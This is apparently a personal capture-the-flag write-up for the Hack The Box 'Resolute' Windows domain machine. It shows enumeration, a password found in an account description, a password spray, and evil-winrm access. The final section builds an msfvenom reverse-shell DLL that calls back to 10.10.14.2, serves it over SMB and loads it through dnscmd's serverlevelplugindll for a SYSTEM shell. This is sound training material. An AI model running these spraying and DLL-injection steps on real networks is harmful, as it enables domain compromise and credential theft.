# Resolute

Tags: AD-Win
Level: Medium
Tools: Crackmapexec, rpcclient, smbmap, smbserver, Dnsadmin, evilwin-RM
Status: Done
Date: August 29, 2024

### Nmap

```bash
# Nmap 7.94SVN scan initiated Fri Jan 12 20:59:16 2024 as: nmap -sV -sC -A -T4 -oN Resolute 10.10.10.169
Nmap scan report for 10.10.10.169
Host is up (0.082s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-13 02:06:39Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m09s, median: 6m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-01-12T18:06:50-08:00
| smb2-time: 
|   date: 2024-01-13T02:06:51
|_  start_date: 2024-01-13T01:59:43

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 12 21:00:05 2024 -- 1 IP address (1 host up) scanned in 49.52 seconds
```

No Interesting information with smbclient and smbmap & nmblookup, nbtscan.

rpcclient and enum4linux given user names information

```bash
smbclient -L 10.10.10.169 
smbclient -L //10.10.10.169
smbmap -H 10.10.10.169
nbtscan 10.10.10.169
nmblookup -A 10.10.10.169
rpcclient -U "" -N 10.10.10.169
rpcclient $> netshareenum
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> netshareenumall
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> guest
command not found: guest
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
rpcclient $> queryuser angela
```

Sorting usernames using awk command 

```bash
cat users | awk -F\['{print $1}' 
cat users | awk -F\[ '{print $1}' 
cat users | awk -F\[ '{print $2}' 
cat users | awk -F\[ '{print $2}' | awk -F\]'
cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}'
cat users | awk -F\[ '{print $2}' | awk -F\] '{print $1}' > user
```

### Enumeration

Using crackmapexec we see the passowrd policy “Their is no account threshold” **we can brute force**

```bash
crackmapexec smb --pass-pol 10.10.10.169           
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [+] Dumping password info for domain: MEGABANK
SMB         10.10.10.169    445    RESOLUTE         Minimum password length: 7
SMB         10.10.10.169    445    RESOLUTE         Password history length: 24
SMB         10.10.10.169    445    RESOLUTE         Maximum password age: Not Set
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Password Complexity Flags: 000000
SMB         10.10.10.169    445    RESOLUTE             Domain Refuse Password Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Store Cleartext: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Lockout Admins: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Clear Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password No Anon Change: 0
SMB         10.10.10.169    445    RESOLUTE             Domain Password Complex: 0
SMB         10.10.10.169    445    RESOLUTE         
SMB         10.10.10.169    445    RESOLUTE         Minimum password age: 1 day 4 minutes 
SMB         10.10.10.169    445    RESOLUTE         Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Locked Account Duration: 30 minutes 
SMB         10.10.10.169    445    RESOLUTE         Account Lockout Threshold: None
SMB         10.10.10.169    445    RESOLUTE         Forced Log off Time: Not Set
```

In **rpcclinet** we found username and **password in the description rpcclient $>querydispinfo**

```bash
Tru with querydispinfo1
querydispinfo2,3
rpcclient $> querydispinfo
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)
```

User:password-marko:Welcome123!

Trying to login with the account using **crackmapexec** but **no successful.**

Tried on the **user** text file we found username and password 

```bash
crackmapexec smb 10.10.10.169 -u marko -p Welcome123!
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/HTB/Resolute]
└─$ crackmapexec smb 10.10.10.169 -u marko -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE

┌──(kali㉿kali)-[~/Desktop/HTB/Resolute]
└─$ crackmapexec smb 10.10.10.169 -u user -p 'Welcome123!'
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
**SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!**
```

List of **shares using smbmap**

```bash
smbmap -d megabank.local -u melanie -p 'Welcome123!' -H 10.10.10.169                  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 10.10.10.169:445        Name: megabank.local            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share
```

checking with crackmapexec

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Resolute]
└─$ crackmapexec winrm 10.10.10.169 -u user -p 'Welcome123!' 
SMB         10.10.10.169    5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.10.10.169    5985   RESOLUTE         [*] http://10.10.10.169:5985/wsman
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\Administrator:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\Guest:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\krbtgt:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\ryan:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\marko:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\sunita:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\abigail:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\marcus:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\sally:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\fred:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\angela:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\felicia:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\gustavo:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\ulf:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\stevie:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\claire:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\paulo:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\steve:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\annette:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\annika:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\per:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\claude:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\melanie:Welcome123! "HTTPConnectionPool(host='10.10.10.169', port=5985): Read timed out. (read timeout=30)"
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\zach:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\simon:Welcome123!
WINRM       10.10.10.169    5985   RESOLUTE         [-] megabank.local\naoki:Welcome123!
```

Their is some information with malanie user not reachable request.

using **secretsdump.py**

![Untitled](Resolute%20caeeeb105dac4f539b775325612b8a41/Untitled.png)

Now trying with [wmiexec.py](http://wmiexec.py) —- No response moving on to another machine

![Untitled](Resolute%20caeeeb105dac4f539b775325612b8a41/Untitled%201.png)

### User flag

```jsx
>evil-winrm -u melanie -p 'Welcome123!'  -i 10.10.10.169/megabank.local
>evil-winrm -u melanie -p 'Welcome123!'  -i 10.10.10.169
#GOt the flag
>iwr -uri http://10.10.14.2:8000/winPEASx64.exe -Outfile winPEAS.exe
C>dir -force #Check the hidden files
>C:\PSTranscripts\20191203> cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
#ryan Serv3r4Admin4cc123!
>evil-winrm -u ryan -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
#In the ryan desktop note system restsart every 1 minute
>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=9001 -f dll > rev.dll
>sudo impacket-smbserver ashok $(pwd)   #Share o the system
>rlwrap nc -nlvp 90001
>dnscmd megabank.local /config /serverlevelplugindll \\10.10.14.2\ashok\rev.dll #No success
>dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.2\ashok\rev.dll
>sc.exe stop dns
>sc.exe start dns
>rlwrap nc -nlvp 90001
# Got root shell

```

### Root flag

SHell